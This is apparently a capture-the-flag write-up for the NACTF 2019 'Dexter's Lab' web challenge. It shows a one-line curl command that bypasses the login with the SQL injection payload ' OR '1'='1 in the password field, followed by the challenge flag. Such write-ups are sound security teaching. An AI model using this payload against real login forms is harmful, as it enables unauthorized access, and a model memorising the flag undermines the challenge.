#### Challenge:

Dee Dee,

Please check in on your brother's lab at dexterslab.web.2019.nactf.com
We know his username is Dexter, but we don't know his password! Maybe you can use a SQL injection?

Mom + Dad

---

#### Solution:

```bash
curl 'http://dexterslab.web.2019.nactf.com/login.php' --data 'username=&password=%27+OR+%271%3D1' 2>/dev/null | grep nactf
```

---

<details><summary>FLAG:</summary>

```
nactf{1nj3c7ion5_ar3_saf3_in_th3_l4b}
```

</details>
